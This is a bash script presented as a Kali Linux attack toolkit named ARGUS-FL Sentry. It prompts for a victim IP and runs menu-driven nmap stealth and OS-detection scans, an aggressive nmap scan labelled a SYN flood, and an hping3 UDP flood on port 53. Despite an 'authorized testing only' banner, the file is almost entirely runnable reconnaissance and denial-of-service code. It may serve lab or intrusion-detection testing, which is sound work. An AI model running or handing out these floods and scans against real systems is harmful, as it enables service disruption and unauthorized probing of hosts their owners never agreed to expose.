#!/bin/bash
# ============================================================
#  ARGUS-FL Sentry — Kali Linux Attack Toolkit
#  Authorized testing only. Never target systems you don't own.
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

clear
echo -e "${RED}"
echo "  █████╗ ██████╗  ██████╗ ██╗   ██╗███████╗"
echo " ██╔══██╗██╔══██╗██╔════╝ ██║   ██║██╔════╝"
echo " ███████║██████╔╝██║  ███╗██║   ██║███████╗"
echo " ██╔══██║██╔══██╗██║   ██║██║   ██║╚════██║"
echo " ██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║"
echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝"
echo -e "${YELLOW}         ATTACK TOOLKIT v2.0${NC}"
echo ""

# ── Ask for target IP ──────────────────────────────────────
echo -e "${CYAN}${BOLD}[*] Target Configuration${NC}"
read -p "    Enter victim IP address: " TARGET_IP

if [ -z "$TARGET_IP" ]; then
    echo -e "${RED}[!] No IP provided. Exiting.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Target set: ${BOLD}$TARGET_IP${NC}"
echo ""

# ── Duration for flood attacks ─────────────────────────────
FLOOD_DURATION=15

# ── Menu ───────────────────────────────────────────────────
show_menu() {
    echo -e "${BOLD}${YELLOW}═══════════════════════════════════════════${NC}"
    echo -e "${BOLD}  ATTACK MENU ${NC}(Target: ${CYAN}$TARGET_IP${NC})"
    echo -e "${BOLD}${YELLOW}═══════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${BOLD}[1]${NC}  SYN Stealth Scan   ${CYAN}(Reconnaissance)${NC}"
    echo -e "  ${BOLD}[2]${NC}  OS Detection Scan   ${CYAN}(Reconnaissance)${NC}"
    echo -e "  ${BOLD}[3]${NC}  SYN Flood (TCP)     ${RED}(DDoS Attack)${NC}"
    echo -e "  ${BOLD}[4]${NC}  UDP Flood (DNS:53)  ${RED}(DDoS Attack)${NC}"
    echo ""
    echo -e "  ${BOLD}[0]${NC}  Exit"
    echo ""
    echo -e "${YELLOW}═══════════════════════════════════════════${NC}"
}

# ── Attack functions ───────────────────────────────────────

attack_syn_scan() {
    echo -e "\n${CYAN}[*] Launching SYN Stealth Scan on $TARGET_IP...${NC}"
    echo -e "${YELLOW}    Command: nmap -sS $TARGET_IP${NC}\n"
    sudo nmap -sS "$TARGET_IP"
    echo -e "\n${GREEN}[✓] SYN Scan complete.${NC}\n"
}

attack_os_scan() {
    echo -e "\n${CYAN}[*] Launching OS Detection Scan on $TARGET_IP...${NC}"
    echo -e "${YELLOW}    Command: nmap -O $TARGET_IP${NC}\n"
    sudo nmap -O "$TARGET_IP"
    echo -e "\n${GREEN}[✓] OS Detection Scan complete.${NC}\n"
}

attack_syn_flood() {
    echo -e "\n${RED}[!] Launching Aggressive SYN Flood Scan on $TARGET_IP for ${FLOOD_DURATION}s...${NC}"
    echo -e "${YELLOW}    Command: nmap -sS -T5 --max-rate 500 -p 1-5000 $TARGET_IP${NC}\n"
    sudo timeout "$FLOOD_DURATION" nmap -sS -T5 --max-rate 500 -p 1-5000 "$TARGET_IP" 2>/dev/null &
    FLOOD_PID=$!

    for i in $(seq "$FLOOD_DURATION" -1 1); do
        echo -ne "\r    ${YELLOW}Flooding... ${i}s remaining ${NC}"
        sleep 1
    done
    echo -e "\r    ${GREEN}[✓] SYN Flood Scan complete.            ${NC}\n"
    kill "$FLOOD_PID" 2>/dev/null
    wait "$FLOOD_PID" 2>/dev/null
}

attack_udp_flood() {
    echo -e "\n${RED}[!] Launching UDP Flood on $TARGET_IP:53 for ${FLOOD_DURATION}s...${NC}"
    echo -e "${YELLOW}    Command: hping3 --udp -i u500 -s ++1024 -p 53 $TARGET_IP${NC}\n"
    sudo timeout "$FLOOD_DURATION" hping3 --udp -i u500 -s ++1024 -p 53 "$TARGET_IP" 2>/dev/null &
    FLOOD_PID=$!

    for i in $(seq "$FLOOD_DURATION" -1 1); do
        echo -ne "\r    ${YELLOW}Flooding... ${i}s remaining ${NC}"
        sleep 1
    done
    echo -e "\r    ${GREEN}[✓] UDP Flood complete.                ${NC}\n"
    kill "$FLOOD_PID" 2>/dev/null
    wait "$FLOOD_PID" 2>/dev/null
}



# ── Main loop ──────────────────────────────────────────────
while true; do
    show_menu
    read -p "  Select attack [0-4]: " CHOICE
    echo ""

    case $CHOICE in
        1) attack_syn_scan ;;
        2) attack_os_scan ;;
        3) attack_syn_flood ;;
        4) attack_udp_flood ;;
        0)
            echo -e "${GREEN}[*] Exiting. Stay ethical.${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Invalid option. Try again.${NC}\n"
            ;;
    esac

    read -p "  Press Enter to continue..."
    clear
done
